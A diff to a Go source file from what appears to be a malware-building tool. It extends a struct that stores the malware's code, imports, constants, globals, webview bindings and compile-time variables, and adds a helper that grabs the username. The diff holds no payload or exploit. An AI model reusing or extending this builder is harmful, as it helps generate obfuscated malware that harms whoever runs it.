@@ -12,11 +12,13 @@ type json_t struct {
 	//  File related stuff
 	File_path string   `json:"file_path"`      // file path to the file we are reading
 	File_gut  string   `json:"file_gut"`       // Contents of the file we read in
-	Functions []Func_t `json:"file_functions"` // A structure containing all function strucs gathered
+	Functions []Func_t `json:"file_functions"` // A structure containing all functions def in the files
 
 	// The malwares actual code will be found here
 	GO_functions []string `json:"go_functions"` // Contains all the real go-code functions for the malware
 	GO_imports   []string `json:"go_imports"`   // Contains all imports needed for the malware to work
+	GO_const     []string `json:"go_const"`     // Contains all consts needed for the malware to work
+	GO_global    []string `json:"go_global"`    // Contains all globals needed for the malware to work
 
 	// Malware content
 	Malware_gut      []string `json:"malware_gut"`     // The contents of the malware file
@@ -44,6 +46,11 @@ type json_t struct {
 	Js_gut   []string          `json:"js_gut"`        // The javascript code used in the webview (not the text editor)
 	Css_gut  []string          `json:"css_gut"`       // The css code used in the webview (not the text editor)
 	Bind_gut map[string]string `json:"bind_gut"`      // Contains all our bindings set by the user
+
+	// Variables
+	Var_max  int     // The max amount of allowed variables
+	Comp_var []Var_t `json:"Compile_variables"` // All the compile time variables
+	Comp_id  int     `json:"Compile_ID"`        // The current index for the compile variable
 }
 
 //
@@ -237,6 +244,24 @@ func (object *json_t) Add_go_import(new_import string) {
 
 //
 //
+// Adds a const line to the final go code
+//
+//
+func (object *json_t) Add_go_const(new_const string) {
+	object.GO_const = append(object.GO_const, new_const)
+}
+
+//
+//
+// Adds a global variable line to the final go code
+//
+//
+func (object *json_t) Add_go_global(new_global string) {
+	object.GO_global = append(object.GO_global, new_global)
+}
+
+//
+//
 // Obfuscates the program
 //
 //
@@ -327,7 +352,7 @@ func (object *json_t) Set_title(value string) {
 func (object *json_t) Add_binding(js_call string, evil_call string) {
 	evil_call = tools.Erase_delimiter(evil_call, `"`)
 
-	if object.Obfuscate { // Assuming that we need to convert the name to the obfuscated version
+	if object.Obfuscate { // Assuming that we need to convert the name to it's obfuscated version
 		for _, d_func := range object.Functions {
 			if d_func.Check_previous_names(evil_call) {
 				evil_call = d_func.Name
@@ -337,4 +362,47 @@ func (object *json_t) Add_binding(js_call string, evil_call string) {
 	}
 
 	object.Bind_gut[js_call] = evil_call
+}
+
+//
+//
+//
+//
+//
+func (object *json_t) Set_variable_value(Var_type string, value string) {
+	if Var_type == "$" {
+		object.Comp_var[object.Comp_id].Set_value(value)
+		object.Comp_id++
+
+		if object.Comp_id >= object.Var_max { // Reset
+			object.Comp_id = 0
+		}
+	}
+}
+
+//
+//
+//
+//
+//
+func (object *json_t) Get_variable_value(Var_type string, var_id string) string {
+	to_return := ""
+
+	id := tools.String_to_int(var_id) - 1
+
+	if id == 665 { // Grab the username
+		to_return = tools.Grab_username()
+
+	} else {
+
+		if id >= object.Var_max {
+			notify.Error(fmt.Sprintf("Invalid index %d", id), "json_struc.Get_variable_value()")
+		}
+
+		if Var_type == "$" {
+			to_return = object.Comp_var[id].Get_value()
+		}
+	}
+
+	return to_return
 }
